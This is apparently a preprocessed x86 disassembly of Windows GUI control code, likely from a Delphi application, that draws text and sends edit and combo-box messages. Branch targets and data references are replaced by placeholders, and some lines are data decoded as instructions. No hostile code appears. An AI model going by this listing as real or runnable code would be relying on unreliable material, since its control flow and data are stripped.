call sub_42420c
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4245ec
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_42420c
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_424a0c
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412d1
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f44
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x60 ]
call sub_404600
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f44
retn
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4245ec
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_44d18c
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_42486c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_416e34
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_416e34
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_40474c
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43cb30
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43cb94
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43ca3c
push 0x0
mov eax edi
call sub_424a0c
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_44d18c
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44f46c
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x80 ]
call sub_4041e0
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x84 ]
call sub_4043e0
push eax
mov eax edi
call sub_424a0c
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_42420c
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x88 ]
call sub_4041e0
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x8c ]
call sub_4043e0
push eax
mov eax edi
call sub_424a0c
push eax
call DrawTextA
sub_4412db
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441356
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4644a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_452f0c
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax ebx
call sub_453fe8
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44135d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_4413a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454cd0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_44c948
mov edx 0x11
mov eax esi
call sub_44c96c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43c850
call sub_43c930
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_441454
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4415aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44f46c
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_42492c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041e8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x160 ]
call sub_424a0c
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a40
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x160 ]
call sub_424a0c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423a40
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x160 ]
call sub_424a0c
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4415b1
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4415bb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4417e4
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424328
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_42420c
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424328
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4245b0
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40338c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40338c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4416dc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424a8c
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40338c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424a8c
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_449f18
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_441820
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4417e4
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441880
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40338c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4418a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c65c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_44190c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441999
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419a0
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4644a8
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4419f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov dl 0x1
mov eax esi
call sub_453cbc
xor edx edx
mov eax esi
call sub_44d350
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_44211c
mov eax esi
test bl bl
je r-xdata
sub_441a98
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441b18
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_441b5c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_453a88
push eax
call SendMessageA
test eax eax
setne bl
sub_441b94
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441bcc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441c49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c50
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_453a88
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
mov eax ebx
call sub_44d168
sub_441c54
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_453d8c
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_453a88
push eax
call SendMessageA
sub_441c90
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_441cb4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441cd4
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_441d04
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_453a88
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441dbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44d100
inc eax
call sub_408890
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4088a4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44d110
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e4d
mov eax [ ebp - 0xc ]
call sub_4088dc
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_441e58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404010
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_44d100
inc eax
call sub_408890
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441ee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4088a4
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d110
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4088dc
retn
sub_441ef4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_441fad
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_450c10
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_450c10
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_442020
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_44205f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_450a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442066
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_442066
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_441b94
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4420e0
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
sub_4420e0
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44211c
pop ebx
retn
sub_44211c
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_423a54
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_44c96c
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_4421e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_451600
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_442220
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_453a88
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_453a88
push eax
call SendMessageA
sub_442260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4530a0
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_4420e0
mov eax ebx
call sub_451028
sub_442294
push ebx
mov ebx eax
mov eax ebx
call sub_452fe4
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44211c
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_4422dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452e3c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_441da0
sub_442318
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_40338c
push 0xfffffff0
mov eax esi
call sub_453a88
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_442350
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_454b88
pop esi
pop ebx
retn
sub_442388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4423ee
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423f5
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41982c
sub_442400
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_442424
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_40456c
mov edx esi
xchg edx eax
call sub_40456c
mov eax [ esi ]
call sub_4043e0
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44247c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4424e0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44d18c
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44d1bc
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424e7
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_4424ec
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44250c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_442534
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_453a88
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44d6c8
sub_442568
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4425db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4043e0
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
